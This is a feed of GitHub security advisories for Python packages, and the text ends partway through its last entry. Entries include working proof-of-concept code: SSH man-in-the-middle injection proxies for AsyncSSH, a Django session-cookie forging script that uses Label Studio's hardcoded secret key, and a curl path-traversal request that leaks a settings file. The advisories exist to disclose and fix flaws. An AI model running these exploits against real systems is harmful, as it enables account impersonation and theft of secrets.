<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2023-11-11T11:01:18.977Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[langchain] Langchain Server-Side Request Forgery vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-6h8p-4hx9-w66c</id>
        <link href="https://github.com/advisories/GHSA-6h8p-4hx9-w66c"/>
        <updated>2023-11-11T05:04:05.000Z</updated>
        <content type="html"><![CDATA[<p>In Langchain before 0.0.329, prompt injection allows an attacker to force the service to retrieve data from an arbitrary URL, essentially providing SSRF and potentially injecting content into downstream tasks.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-32786">https://nvd.nist.gov/vuln/detail/CVE-2023-32786</a></li>
<li><a href="https://gist.github.com/rharang/d265f46fc3161b31ac2e81db44d662e1">https://gist.github.com/rharang/d265f46fc3161b31ac2e81db44d662e1</a></li>
<li><a href="https://github.com/langchain-ai/langchain/pull/12747">https://github.com/langchain-ai/langchain/pull/12747</a></li>
<li><a href="https://github.com/langchain-ai/langchain/releases/tag/v0.0.329">https://github.com/langchain-ai/langchain/releases/tag/v0.0.329</a></li>
<li><a href="https://github.com/advisories/GHSA-6h8p-4hx9-w66c">https://github.com/advisories/GHSA-6h8p-4hx9-w66c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6h8p-4hx9-w66c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-10-21T00:30:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pyarrow] PyArrow: Arbitrary code execution when loading a malicious data file]]></title>
        <id>https://github.com/advisories/GHSA-5wvp-7f3h-6wmm</id>
        <link href="https://github.com/advisories/GHSA-5wvp-7f3h-6wmm"/>
        <updated>2023-11-10T22:16:37.000Z</updated>
        <content type="html"><![CDATA[<p>Deserialization of untrusted data in IPC and Parquet readers in PyArrow versions 0.14.0 to 14.0.0 allows arbitrary code execution. An application is vulnerable if it reads Arrow IPC, Feather or Parquet data from untrusted sources (for example user-supplied input files).</p>
<p>This vulnerability only affects PyArrow, not other Apache Arrow implementations or bindings.</p>
<p>It is recommended that users of PyArrow upgrade to 14.0.1. Similarly, it is recommended that downstream libraries upgrade their dependency requirements to PyArrow 14.0.1 or later. PyPI packages are already available, and we hope that conda-forge packages will be available soon.</p>
<p>If it is not possible to upgrade, maintainers provide a separate package <code>pyarrow-hotfix</code> that disables the vulnerability on older PyArrow versions. See <a href="https://pypi.org/project/pyarrow-hotfix/">https://pypi.org/project/pyarrow-hotfix/</a>  for instructions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-47248">https://nvd.nist.gov/vuln/detail/CVE-2023-47248</a></li>
<li><a href="https://lists.apache.org/thread/yhy7tdfjf9hrl9vfrtzo8p2cyjq87v7n">https://lists.apache.org/thread/yhy7tdfjf9hrl9vfrtzo8p2cyjq87v7n</a></li>
<li><a href="https://pypi.org/project/pyarrow-hotfix/">https://pypi.org/project/pyarrow-hotfix/</a></li>
<li><a href="https://github.com/apache/arrow/commit/f14170976372436ec1d03a724d8d3f3925484ecf">https://github.com/apache/arrow/commit/f14170976372436ec1d03a724d8d3f3925484ecf</a></li>
<li><a href="https://github.com/advisories/GHSA-5wvp-7f3h-6wmm">https://github.com/advisories/GHSA-5wvp-7f3h-6wmm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5wvp-7f3h-6wmm</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-11-09T09:30:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[esptool] esptool allows attackers to view sensitive information via weak cryptographic algorithm]]></title>
        <id>https://github.com/advisories/GHSA-3f38-96qm-r3fw</id>
        <link href="https://github.com/advisories/GHSA-3f38-96qm-r3fw"/>
        <updated>2023-11-09T22:10:34.000Z</updated>
        <content type="html"><![CDATA[<p>An issue discovered in esptool 4.6.2 allows attackers to view sensitive information via weak cryptographic algorithm.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46894">https://nvd.nist.gov/vuln/detail/CVE-2023-46894</a></li>
<li><a href="https://github.com/espressif/esptool/issues/926">https://github.com/espressif/esptool/issues/926</a></li>
<li><a href="https://github.com/advisories/GHSA-3f38-96qm-r3fw">https://github.com/advisories/GHSA-3f38-96qm-r3fw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3f38-96qm-r3fw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-11-09T18:34:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[asyncssh] AsyncSSH Rogue Session Attack]]></title>
        <id>https://github.com/advisories/GHSA-c35q-ffpf-5qpm</id>
        <link href="https://github.com/advisories/GHSA-c35q-ffpf-5qpm"/>
        <updated>2023-11-09T18:35:16.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An issue in AsyncSSH v2.14.0 and earlier allows attackers to control the remote end of an SSH client session via packet injection/removal and shell emulation.</p>
<h3 id="details">Details</h3>
<p>The rogue session attack targets any SSH client connecting to an AsyncSSH server, on which the attacker must have a shell account. The goal of the attack is to log the client into the attacker's account without the client being able to detect this. At that point, due to how SSH sessions interact with shell environments, the attacker has complete control over the remote end of the SSH session. The attacker receives all keyboard input by the user, completely controls the terminal output of the user's session, can send and receive data to/from forwarded network ports, and is able to create signatures with a forwarded SSH Agent, if any. The result is a complete break of the confidentiality and integrity of the secure channel, providing a strong vector for a targeted phishing campaign against the user. For example, the attacker can display a password prompt and wait for the user to enter the password, elevating the attacker's position to a MitM at the application layer and enabling perfect shell emulation.</p>
<p>The attacks work by the attacker injecting a chosen authentication request before the client's NewKeys. The authentication request sent by the attacker must be a valid authentication request containing his credentials. The attacker can use any authentication mechanism that does not require exchanging additional messages between client and server, such as password or publickey. Due to a state machine flaw, the AsyncSSH server accepts the unauthenticated user authentication request message and defers it until the client has requested the authentication protocol.</p>
<h3 id="poc">PoC</h3>
<details>
  <summary>AsyncSSH 2.14.0 client (simple_client.py example) connecting to AsyncSSH 2.14.0 server (simple_server.py example)</summary>

<pre><code class="language-python">#!/usr/bin/python3
import socket
from threading import Thread
from binascii import unhexlify
from time import sleep

##################################################################################
## Proof of Concept for the rogue session attack (ChaCha20-Poly1305)            ##
##                                                                              ##
## Variant: Unmodified variant (EXT_INFO by client required)                    ##
##                                                                              ##
## Client(s) tested: AsyncSSH 2.14.0 (simple_client.py example)                 ##
## Server(s) tested: AsyncSSH 2.14.0 (simple_server.py example)                 ##
##                                                                              ##
## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0 ##
##################################################################################

# IP and port for the TCP proxy to bind to
PROXY_IP = '127.0.0.1'
PROXY_PORT = 2222

# IP and port of the server
SERVER_IP = '127.0.0.1'
SERVER_PORT = 22

# Length of the individual messages
NEW_KEYS_LENGTH = 16
CLIENT_EXT_INFO_LENGTH = 60
# Additional data sent by the client after NEW_KEYS (excluding EXT_INFO)
ADDITIONAL_CLIENT_DATA_LENGTH = 60

newkeys_payload = b'\x00\x00\x00\x0c\x0a\x15'
def contains_newkeys(data):
    return newkeys_payload in data

rogue_userauth_request = unhexlify('000000440b320000000861747461636b65720000000e7373682d636f6e6e656374696f6e0000000870617373776f7264000000000861747461636b65720000000000000000000000')
def insert_rogue_authentication_request(data):
    newkeys_index = data.index(newkeys_payload)
    # Insert rogue authentication request and remove SSH_MSG_EXT_INFO
    return data[:newkeys_index] + rogue_userauth_request + data[newkeys_index:newkeys_index + NEW_KEYS_LENGTH] + data[newkeys_index + NEW_KEYS_LENGTH + CLIENT_EXT_INFO_LENGTH:]

def forward_client_to_server(client_socket, server_socket):
    delay_next = False
    try:
        while True:
            client_data = client_socket.recv(4096)
            if delay_next:
                delay_next = False
                sleep(0.25)
            if contains_newkeys(client_data):
                print("[+] SSH_MSG_NEWKEYS sent by client identified!")
                if len(client_data) &lt; NEW_KEYS_LENGTH + CLIENT_EXT_INFO_LENGTH + ADDITIONAL_CLIENT_DATA_LENGTH:
                    print("[+] client_data does not contain all messages sent by the client yet. Receiving additional bytes until we have 156 bytes buffered!")
                while len(client_data) &lt; NEW_KEYS_LENGTH + CLIENT_EXT_INFO_LENGTH + ADDITIONAL_CLIENT_DATA_LENGTH:
                    client_data += client_socket.recv(4096)
                print(f"[d] Original client_data before modification: {client_data.hex()}")
                client_data = insert_rogue_authentication_request(client_data)
                print(f"[d] Modified client_data with rogue authentication request: {client_data.hex()}")
                delay_next = True
            if len(client_data) == 0:
                break
            server_socket.send(client_data)
    except ConnectionResetError:
        print("[!] Client connection has been reset. Continue closing sockets.")
    print("[!] forward_client_to_server thread ran out of data, closing sockets!")
    client_socket.close()
    server_socket.close()

def forward_server_to_client(client_socket, server_socket):
    try:
        while True:
            server_data = server_socket.recv(4096)
            if len(server_data) == 0:
                break
            client_socket.send(server_data)
    except ConnectionResetError:
        print("[!] Target connection has been reset. Continue closing sockets.")
    print("[!] forward_server_to_client thread ran out of data, closing sockets!")
    client_socket.close()
    server_socket.close()

if __name__ == '__main__':
    print("--- Proof of Concept for the rogue session attack (ChaCha20-Poly1305) ---")
    mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mitm_socket.bind((PROXY_IP, PROXY_PORT))
    mitm_socket.listen(5)

    print(f"[+] MitM Proxy started. Listening on {(PROXY_IP, PROXY_PORT)} for incoming connections...")

    try:
        while True:
            client_socket, client_addr = mitm_socket.accept()
            print(f"[+] Accepted connection from: {client_addr}")
            print(f"[+] Establishing new server connection to {(SERVER_IP, SERVER_PORT)}.")
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect((SERVER_IP, SERVER_PORT))
            print("[+] Spawning new forwarding threads to handle client connection.")
            Thread(target=forward_client_to_server, args=(client_socket, server_socket)).start()
            Thread(target=forward_server_to_client, args=(client_socket, server_socket)).start()
    except KeyboardInterrupt:
        client_socket.close()
        server_socket.close()
        mitm_socket.close()
</code></pre>
</details>

<h3 id="impact">Impact</h3>
<p>The impact heavily depends on the application logic implemented by the AsyncSSH server. In the worst case, the AsyncSSH server starts a shell for the authenticated user upon connection, switching the user to the authenticated one. In this case, the attacker can prepare a modified shell beforehand to perform perfect phishing attacks and become a MitM at the application layer. When the username of the authenticated user is not used beyond authentication, this vulnerability does not impact the connection's security.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ronf/asyncssh/security/advisories/GHSA-c35q-ffpf-5qpm">https://github.com/ronf/asyncssh/security/advisories/GHSA-c35q-ffpf-5qpm</a></li>
<li><a href="https://github.com/ronf/asyncssh/commit/83e43f5ea3470a8617fc388c72b062c7136efd7e">https://github.com/ronf/asyncssh/commit/83e43f5ea3470a8617fc388c72b062c7136efd7e</a></li>
<li><a href="https://github.com/advisories/GHSA-c35q-ffpf-5qpm">https://github.com/advisories/GHSA-c35q-ffpf-5qpm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c35q-ffpf-5qpm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-11-09T18:35:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[asyncssh] AsyncSSH Rogue Extension Negotiation]]></title>
        <id>https://github.com/advisories/GHSA-cfc2-wr2v-gxm5</id>
        <link href="https://github.com/advisories/GHSA-cfc2-wr2v-gxm5"/>
        <updated>2023-11-09T18:34:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An issue in AsyncSSH v2.14.0 and earlier allows attackers to control the extension info message (RFC 8308) via a man-in-the-middle attack.</p>
<h3 id="details">Details</h3>
<p>The rogue extension negotiation attack targets an AsyncSSH client connecting to any SSH server sending an extension info message. The attack exploits an implementation flaw in the AsyncSSH implementation to inject an extension info message chosen by the attacker and delete the original extension info message, effectively replacing it.</p>
<p>A correct SSH implementation should not process an unauthenticated extension info message. However, the injected message is accepted due to flaws in AsyncSSH. AsyncSSH supports the server-sig-algs and global-requests-ok extensions. Hence, the attacker can downgrade the algorithm used for client authentication by meddling with the value of server-sig-algs (e.g. use of SHA-1 instead of SHA-2).</p>
<h3 id="poc">PoC</h3>
<details>
    <summary>AsyncSSH Client 2.14.0 (simple_client.py example) connecting to AsyncSSH Server 2.14.0 (simple_server.py example)</summary>

<pre><code class="language-python"> #!/usr/bin/python3
 import socket
 from threading import Thread
 from binascii import unhexlify
 
 #####################################################################################
 ## Proof of Concept for the rogue extension negotiation attack (ChaCha20-Poly1305) ##
 ##                                                                                 ##
 ## Client(s) tested: AsyncSSH 2.14.0 (simple_client.py example)                    ##
 ## Server(s) tested: AsyncSSH 2.14.0 (simple_server.py example)                    ##
 ##                                                                                 ##
 ## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0    ##
 #####################################################################################
 
 # IP and port for the TCP proxy to bind to
 PROXY_IP = '127.0.0.1'
 PROXY_PORT = 2222
 
 # IP and port of the server
 SERVER_IP = '127.0.0.1'
 SERVER_PORT = 22
 
 # Length of the individual messages
 NEW_KEYS_LENGTH = 16
 SERVER_EXT_INFO_LENGTH = 676
 
 newkeys_payload = b'\x00\x00\x00\x0c\x0a\x15'
 def contains_newkeys(data):
     return newkeys_payload in data
 
 # Empty EXT_INFO here to keep things simple, but may also contain actual extensions like server-sig-algs
 rogue_ext_info = unhexlify('0000000C060700000000000000000000')
 def insert_rogue_ext_info(data):
     newkeys_index = data.index(newkeys_payload)
     # Insert rogue extension info and remove SSH_MSG_EXT_INFO
     return data[:newkeys_index] + rogue_ext_info + data[newkeys_index:newkeys_index + NEW_KEYS_LENGTH] + data[newkeys_index + NEW_KEYS_LENGTH + SERVER_EXT_INFO_LENGTH:]
 
 def forward_client_to_server(client_socket, server_socket):
     try:
         while True:
             client_data = client_socket.recv(4096)
             if len(client_data) == 0:
                 break
             server_socket.send(client_data)
     except ConnectionResetError:
         print("[!] Client connection has been reset. Continue closing sockets.")
     print("[!] forward_client_to_server thread ran out of data, closing sockets!")
     client_socket.close()
     server_socket.close()
 
 def forward_server_to_client(client_socket, server_socket):
     try:
         while True:
             server_data = server_socket.recv(4096)
             if contains_newkeys(server_data):
                 print("[+] SSH_MSG_NEWKEYS sent by server identified!")
                 if len(server_data) &lt; NEW_KEYS_LENGTH + SERVER_EXT_INFO_LENGTH:
                     print("[+] server_data does not contain all messages sent by the server yet. Receiving additional bytes until we have 692 bytes buffered!")
                 while len(server_data) &lt; NEW_KEYS_LENGTH + SERVER_EXT_INFO_LENGTH:
                     server_data += server_socket.recv(4096)
                 print(f"[d] Original server_data before modification: {server_data.hex()}")
                 server_data = insert_rogue_ext_info(server_data)
                 print(f"[d] Modified server_data with rogue extension info: {server_data.hex()}")
             if len(server_data) == 0:
                 break
             client_socket.send(server_data)
     except ConnectionResetError:
         print("[!] Target connection has been reset. Continue closing sockets.")
     print("[!] forward_server_to_client thread ran out of data, closing sockets!")
     client_socket.close()
     server_socket.close()
 
 if __name__ == '__main__':
     print("--- Proof of Concept for the rogue extension negotiation attack (ChaCha20-Poly1305) ---")
     mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     mitm_socket.bind((PROXY_IP, PROXY_PORT))
     mitm_socket.listen(5)
 
     print(f"[+] MitM Proxy started. Listening on {(PROXY_IP, PROXY_PORT)} for incoming connections...")
 
     try:
         while True:
             client_socket, client_addr = mitm_socket.accept()
             print(f"[+] Accepted connection from: {client_addr}")
             print(f"[+] Establishing new server connection to {(SERVER_IP, SERVER_PORT)}.")
             server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             server_socket.connect((SERVER_IP, SERVER_PORT))
             print("[+] Spawning new forwarding threads to handle client connection.")
             Thread(target=forward_client_to_server, args=(client_socket, server_socket)).start()
             Thread(target=forward_server_to_client, args=(client_socket, server_socket)).start()
     except KeyboardInterrupt:
         client_socket.close()
         server_socket.close()
         mitm_socket.close()
</code></pre>
</details>

<h3 id="impact">Impact</h3>
<p>Algorithm downgrade during user authentication.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ronf/asyncssh/security/advisories/GHSA-cfc2-wr2v-gxm5">https://github.com/ronf/asyncssh/security/advisories/GHSA-cfc2-wr2v-gxm5</a></li>
<li><a href="https://github.com/ronf/asyncssh/commit/83e43f5ea3470a8617fc388c72b062c7136efd7e">https://github.com/ronf/asyncssh/commit/83e43f5ea3470a8617fc388c72b062c7136efd7e</a></li>
<li><a href="https://github.com/advisories/GHSA-cfc2-wr2v-gxm5">https://github.com/advisories/GHSA-cfc2-wr2v-gxm5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cfc2-wr2v-gxm5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-11-09T18:34:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[label-studio] Label Studio has Hardcoded Django `SECRET_KEY` that can be Abused to Forge Session Tokens]]></title>
        <id>https://github.com/advisories/GHSA-f475-x83m-rx5m</id>
        <link href="https://github.com/advisories/GHSA-f475-x83m-rx5m"/>
        <updated>2023-11-09T16:46:26.000Z</updated>
        <content type="html"><![CDATA[<h1 id="introduction">Introduction</h1>
<p>This write-up describes a vulnerability found in <a href="https://github.com/HumanSignal/label-studio">Label Studio</a>, a popular open source data labeling tool. The vulnerability was found to affect versions before <code>1.8.2</code>, where a patch was introduced.</p>
<h1 id="overview">Overview</h1>
<p>In <a href="https://github.com/HumanSignal/label-studio/tree/1.8.1">Label Studio version 1.8.1</a>, a hard coded Django <code>SECRET_KEY</code> was set in the application settings. The Django <code>SECRET_KEY</code> is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.</p>
<p>However, the Django framework inserts a <code>_auth_user_hash</code> claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in <a href="https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0"><code>1.9.2post0</code></a>) and forge session tokens for all users on Label Studio using the hard coded <code>SECRET_KEY</code>.</p>
<h1 id="description">Description</h1>
<p>Below is the code snippet of the Django settings file at <a href="https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108"><code>label_studio/core/settings/base.py</code></a>.</p>
<pre><code class="language-python"># SECURITY WARNING: keep the secret key used in production secret!
SECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'
</code></pre>
<p>This secret is hard coded across all instances of Label Studio.</p>
<h1 id="proof-of-concept">Proof of Concept</h1>
<p>Below are the steps that an attacker could do to forge a session token of any account on Label Studio:</p>
<ol>
<li><p>Exploit the ORM Leak vulnerability (patched in <a href="https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0"><code>1.9.2post0</code></a>) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email <code>ghostccamm@testvm.local</code> with the password hash <code>pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=</code> that was retrieved.</p>
</li>
<li><p>Create a new Django project with an empty application. In <code>cookieforge/cookieforge/settings.py</code> set the <code>SECRET_KEY</code> to <code>$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n</code>. Create a management command with the following code that will be used to create forged session tokens.</p>
</li>
</ol>
<pre><code class="language-python">from typing import Any
from django.core.management.base import  BaseCommand, CommandParser
from django.core import signing
from django.utils.crypto import salted_hmac
from django.conf import settings
import time, uuid

class Command(BaseCommand):
    help = "Forge a users session cookie on Label Studio"

    def add_arguments(self, parser: CommandParser) -&gt; None:
        parser.add_argument(
            '-o', '--organisation',
            help='Organisation ID to access',
            default=1,
            type=int
        )

        parser.add_argument(
            'user_id',
            help='The User ID of the victim you want to impersonate',
            type=str
        )

        parser.add_argument(
            'user_hash',
            help='The password hash the user you want to impersonate'
        )

    def handle(self, *args: Any, **options: Any) -&gt; str | None:
        key = settings.SECRET_KEY
        # Creates the _auth_user_hash HMAC of the victim's password hash
        auth_user_hash = salted_hmac(
            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',
            options['user_hash'],
            secret=key,
            algorithm="sha256"
        ).hexdigest()

        session_dict = {
            'uid': str(uuid.uuid4()), 
            'organization_pk': options['organisation'], 
            'next_page': '/projects/', 
            'last_login': time.time(), 
            '_auth_user_id': options['user_id'], 
            '_auth_user_backend': 
            'django.contrib.auth.backends.ModelBackend', 
            '_auth_user_hash': auth_user_hash, 
            'keep_me_logged_in': True, 
            '_session_expiry': 600
        }

        # Creates a forged session token
        session_token = signing.dumps(
            session_dict,
            key=key,
            salt="django.contrib.sessions.backends.signed_cookies",
            compress=True
        )

        self.stdout.write(
            self.style.SUCCESS(f"session token: {session_token}")
        )
</code></pre>
<ol start="3">
<li>Next run the following command replacing the <code>{user_id}</code> with the user ID of the account you want to the impersonate and <code>{user_hash}</code> with the victim's password hash. Copy the session token that is printed.</li>
</ol>
<pre><code class="language-python">python3 manage.py forgecookie {user_id} '{user_hash}'
</code></pre>
<ol start="4">
<li>Change the <code>sessionid</code> cookie on the browser and refresh the page. Observe being authenticated as the victim user.</li>
</ol>
<h1 id="impact">Impact</h1>
<p>This vulnerability can be chained with the ORM Leak vulnerability (which was patched in <a href="https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0"><code>1.9.2post0</code></a>) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.</p>
<h1 id="remediation-advice">Remediation Advice</h1>
<p>It is important to note that the hard coded <code>SECRET_KEY</code> has already been removed in Label Studio versions <code>&gt;=1.8.2</code>. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.</p>
<p>We recommend that Human Signal to release a public disclosure about the hard coded <code>SECRET_KEY</code> to encourage users to patch to a version <code>&gt;=1.8.2</code> to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.</p>
<h1 id="discovered">Discovered</h1>
<ul>
<li>August 2023, Robert Schuh, @robbilie</li>
<li>August 2023, Alex Brown, elttam</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/HumanSignal/label-studio/security/advisories/GHSA-f475-x83m-rx5m">https://github.com/HumanSignal/label-studio/security/advisories/GHSA-f475-x83m-rx5m</a></li>
<li><a href="https://github.com/HumanSignal/label-studio/pull/4690">https://github.com/HumanSignal/label-studio/pull/4690</a></li>
<li><a href="https://github.com/HumanSignal/label-studio/commit/3d06c5131c15600621e08b06f07d976887cde81b">https://github.com/HumanSignal/label-studio/commit/3d06c5131c15600621e08b06f07d976887cde81b</a></li>
<li><a href="https://github.com/HumanSignal/label-studio/releases/tag/1.8.2">https://github.com/HumanSignal/label-studio/releases/tag/1.8.2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-43791">https://nvd.nist.gov/vuln/detail/CVE-2023-43791</a></li>
<li><a href="https://github.com/advisories/GHSA-f475-x83m-rx5m">https://github.com/advisories/GHSA-f475-x83m-rx5m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f475-x83m-rx5m</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-11-09T14:42:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dulwich] Dulwich RCE Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-cwwh-4382-6fwr</id>
        <link href="https://github.com/advisories/GHSA-cwwh-4382-6fwr"/>
        <updated>2023-11-09T05:04:06.000Z</updated>
        <content type="html"><![CDATA[<p>Dulwich before 0.18.5, when an SSH subprocess is used, allows remote attackers to execute arbitrary commands via an ssh URL with an initial dash character in the hostname, a related issue to CVE-2017-9800, CVE-2017-12836, CVE-2017-12976, CVE-2017-1000116, and CVE-2017-1000117.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-16228">https://nvd.nist.gov/vuln/detail/CVE-2017-16228</a></li>
<li><a href="https://tracker.debian.org/news/882440">https://tracker.debian.org/news/882440</a></li>
<li><a href="https://github.com/jelmer/dulwich/commit/7116a0cbbda571f7dac863f4b1c00b6e16d6d8d6">https://github.com/jelmer/dulwich/commit/7116a0cbbda571f7dac863f4b1c00b6e16d6d8d6</a></li>
<li><a href="https://web.archive.org/web/20201220231743/https://www.dulwich.io/code/dulwich/commit/7116a0cbbda571f7dac863f4b1c00b6e16d6d8d6/">https://web.archive.org/web/20201220231743/https://www.dulwich.io/code/dulwich/commit/7116a0cbbda571f7dac863f4b1c00b6e16d6d8d6/</a></li>
<li><a href="https://web.archive.org/web/20210128154006/https://www.dulwich.io/code/dulwich/">https://web.archive.org/web/20210128154006/https://www.dulwich.io/code/dulwich/</a></li>
<li><a href="https://github.com/advisories/GHSA-cwwh-4382-6fwr">https://github.com/advisories/GHSA-cwwh-4382-6fwr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cwwh-4382-6fwr</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-05-13T01:44:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[label-studio] Nginx alias path traversal allows unauthenticated attackers to read all files on /label_studio/core/]]></title>
        <id>https://github.com/advisories/GHSA-cpmr-mw4j-99r7</id>
        <link href="https://github.com/advisories/GHSA-cpmr-mw4j-99r7"/>
        <updated>2023-11-08T22:39:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The vulnerability resides on the Nginx config file:
<a href="https://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119">https://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119</a></p>
<p>The pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash <code>/</code> at the end, the following code shows an example of a safe configuration:</p>
<pre><code class="language-nginx">location /static/ {
[...]
</code></pre>
<p>The vulnerability works because Nginx will think that <code>/static../</code> is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.</p>
<p>Of course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.
This is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)</p>
<p>** Proof-of-Concept (Leaking Secret Keys): **
Exploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.</p>
<pre><code class="language-bash"># Production Label Studio docker-compose running on localhost:8080
/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py
"""This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.
"""
import os
import pathlib

from core.settings.base import *

DJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)
DATABASES = {'default': DATABASES_ALL[DJANGO_DB]}

MIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')
MIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')
if INACTIVITY_SESSION_TIMEOUT_ENABLED:
    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')

ADD_DEFAULT_ML_BACKENDS = False

LOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')

DEBUG = get_bool_env('DEBUG', False)

DEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)

SESSION_COOKIE_SECURE = False

SESSION_ENGINE = "django.contrib.sessions.backends.signed_cookies"

RQ_QUEUES = {}

SENTRY_DSN = get_env(
    'SENTRY_DSN',
    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'
)
SENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')

FRONTEND_SENTRY_DSN = get_env(
    'FRONTEND_SENTRY_DSN',
    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')
FRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')

